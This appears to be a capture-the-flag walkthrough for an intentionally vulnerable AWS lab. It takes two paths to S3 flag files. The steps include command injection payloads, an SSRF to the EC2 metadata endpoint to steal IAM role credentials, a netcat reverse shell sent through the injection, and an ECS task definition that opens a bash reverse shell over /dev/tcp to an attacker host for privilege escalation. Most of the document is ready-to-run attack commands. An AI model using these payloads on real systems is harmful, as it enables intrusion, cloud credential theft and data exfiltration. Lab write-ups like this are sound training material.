# Easy Path

Go to `http://<ec2_ip_address>`

### Command Injection

```bash
# Command Injection on web.
; aws s3 ls
; aws s3 ls s3://<bucket-name>/
; aws s3 cp s3://<bucket-name>/flag.txt .
; cat flag.txt
```

### SSRF

```bash
# SSRF Attack.
http://<ec2_ip_address>/?url=http://[::ffff:a9fe:a9fe]/latest/meta-data/iam/security-credentials/<role>

# Configure credentials.
aws configure --profile attacker
echo "aws_session_token = <token>" >> ~/.aws/credentials

# Access to S3.
aws s3 ls
aws s3 ls s3://<bucket-name>/
aws s3 cp s3://<bucket-name>/flag.txt .
cat flag.txt
```


# Hard Path

Go to `http://<ec2_ip_address>`

### SSRF

* Using IPv6 to SSRF on web with `http://[::ffff:a9fe:a9fe]/latest/meta-data/iam/security-credentials/<role>`
* Get credentials & using it to your CLI profile.

    ```bash
    aws configure --profile attacker
    echo "aws_session_token = <token>" >> ~/.aws/credentials
    ```

### Command Injection

- prepare another host for revshell attack with `nc -lvp 4000`
- command injection on web with `; nc <ip_address> 4000 -e /bin/sh &`

### For more information

- more information about iam.

    ```bash
    aws sts get-caller-identity
    aws iam list-roles
    aws iam get-role --role-name <role>
    aws iam list-attached-role-policies --role-name <role>
    aws iam list-role-policies --role-name <role>
    aws iam get-role-policy --role-name <role> --policy-name <policy>
    ````

- more information about ecs clusters.

    ```bash
    aws ecs list-clusters --region <region>
    aws ecs describe-clusters --region <region> --clusters <cluster>
    aws ecs list-container-instances --region <region> --cluster <cluster_arn>
    ```
- find available vpc subnets.

    ```bash
    aws ec2 describe-subnets --region <region>
    ```

### ECS Privesc

1. Attacker prepare revshell at other public ip point with `nc -lvp 4000`.

2. And now come back to CLI.

3. Create an ECS Task Definition JSON File:
    
    Create a file named task-definition.json and include the following content.
    Replace `<region>`, `<task_name>`, `<task_role_arn>`, `<revshell_ip>`, and `<revshell_port>` with your actual values.

    ```json
    {
      "family": "<task_name>",
      "taskRoleArn": "<task_role_arn>",
      "networkMode": "awsvpc",
      "cpu": "256",
      "memory": "512",
      "requiresCompatibilities": ["FARGATE"],
      "containerDefinitions": [
        {
          "name": "exfil_creds",
          "image": "python:latest",
          "entryPoint": ["sh", "-c"],
          "command": ["/bin/bash -c \\\"bash -i >& /dev/tcp/<revshell_ip>/<revshell_port> 0>&1\\\""]
        }
      ]
    }
    ```

4. Create an ECS Run Task JSON File.

    Create a file named run-task.json and include the following content. Replace `<subnet>` with the actual values for your setup.

    ```json
    {
      "launchType": "FARGATE",
      "networkConfiguration": {
        "awsvpcConfiguration": {
          "assignPublicIp": "ENABLED",
          "subnets": ["<subnet>"]
        }
      }
    }
    ```

5. Register Task Definition and Run Task

    Now, you can use the AWS CLI with the JSON files to execute the commands.

    ```bash
    # Register task definition
    aws ecs register-task-definition --region <region> --cli-input-json file://task-definition.json
   
   # Run task
    aws ecs run-task --region <region> --task-definition <task_name> --cluster <cluster_name> --cli-input-json file://run-task.json
    ```

    After a few minutes, the revshell will be connected by container.
    Let's access to s3 on revshell.

### Access S3

```bash
apt update
apt install awscli

aws s3 ls
aws s3 ls s3://<bucket-name>/
aws s3 cp s3://<bucket-name>/secret-string.txt .
cat secret-string.txt
```